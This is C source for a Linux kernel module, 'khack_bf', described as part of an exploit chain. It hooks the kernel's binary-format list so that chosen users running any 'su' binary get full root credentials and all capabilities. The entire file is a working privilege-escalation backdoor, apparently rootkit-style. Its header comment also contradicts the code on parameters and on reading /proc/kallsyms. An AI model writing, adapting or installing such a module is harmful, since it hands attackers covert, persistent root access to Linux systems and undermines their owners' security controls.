// SPDX-License-Identifier: GPL-2.0
/* khack_bf - binfmt root provider, zero parameters.
 *
 * The exploit chain sets kptr_restrict=0 before insmod, so module_init can
 * read /proc/kallsyms and locate fs/exec.c:formats by name.  Splicing our
 * linux_binfmt to the head of that list makes it run before the ELF loader:
 * a whitelisted "su" gets bprm->cred rewritten to root and we return
 * -ENOEXEC so the ELF handler loads the real binary as root.
 *
 * No proc/dev node, no call_usermodehelper, no kthread, no 64 MB scan.
 */
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/slab.h>
#include <linux/cred.h>
#include <linux/sched.h>
#include <linux/string.h>
#include <linux/list.h>
#include <linux/binfmts.h>
#include <linux/capability.h>
#include <linux/uaccess.h>

#define KMAX_ALLOW 8
static volatile int allow_uids[KMAX_ALLOW] = { -1, -1, -1, -1, -1, -1, -1, -1 };

static bool uid_allowed(u32 uid)
{
	int i;

	if (uid == 0)
		return true;
	for (i = 0; i < KMAX_ALLOW; i++)
		if ((u32)*(volatile int *)&allow_uids[i] == uid && uid != 0xFFFFFFFFu)
			return true;
	return false;
}

/* formats address comes from userspace (bootstrap) as a parameter:
 * reading /proc/kallsyms from module_init is what crashed the box. */
static unsigned long formats_addr;
module_param(formats_addr, ulong, 0444);
MODULE_PARM_DESC(formats_addr, "address of fs/exec.c:formats list_head");

/* ---- binfmt hook ---- */
static bool looks_like_su(const char *p)
{
	int n;

	if (!p)
		return false;
	n = strlen(p);
	if (n == 2)
		return p[0] == 's' && p[1] == 'u';
	if (n > 3 && p[n - 3] == '/' && p[n - 2] == 's' && p[n - 1] == 'u')
		return true;
	return false;
}

static bool binfmt_linked;

static int khack_load_binary(struct linux_binprm *bprm)
{
	struct cred *cred;

	if (!bprm || !bprm->filename)
		return -ENOEXEC;
	if (!looks_like_su(bprm->filename))
		return -ENOEXEC;
	if (!uid_allowed(__kuid_val(current_uid())))
		return -ENOEXEC;

	cred = bprm->cred;
	if (!cred)
		return -ENOEXEC;

	cred->uid  = GLOBAL_ROOT_UID;
	cred->gid  = GLOBAL_ROOT_GID;
	cred->suid = GLOBAL_ROOT_UID;
	cred->sgid = GLOBAL_ROOT_GID;
	cred->euid = GLOBAL_ROOT_UID;
	cred->egid = GLOBAL_ROOT_GID;
	cred->fsuid = GLOBAL_ROOT_UID;
	cred->fsgid = GLOBAL_ROOT_GID;
	memset(&cred->cap_inheritable, 0xff, sizeof(cred->cap_inheritable));
	memset(&cred->cap_permitted,   0xff, sizeof(cred->cap_permitted));
	memset(&cred->cap_effective,   0xff, sizeof(cred->cap_effective));
	memset(&cred->cap_bset,        0xff, sizeof(cred->cap_bset));
	memset(&cred->cap_ambient,     0xff, sizeof(cred->cap_ambient));

	pr_info("khack_bf: grant su to uid %u (%s)\n",
		__kuid_val(current_uid()), bprm->filename);
	return -ENOEXEC;
}

static struct linux_binfmt khack_binfmt = {
	.module      = THIS_MODULE,
	.load_binary = khack_load_binary,
};

static int __init khack_init(void)
{
	if (!formats_addr) {
		pr_info("khack_bf: formats_addr not given\n");
		return -EINVAL;
	}

	INIT_LIST_HEAD(&khack_binfmt.lh);
	list_add(&khack_binfmt.lh, (struct list_head *)formats_addr);
	binfmt_linked = true;

	pr_info("khack_bf: ready, formats=%px\n", (void *)formats_addr);
	return 0;
}

static void __exit khack_exit(void)
{
	if (binfmt_linked)
		list_del(&khack_binfmt.lh);
}

module_init(khack_init);
module_exit(khack_exit);
MODULE_LICENSE("GPL");
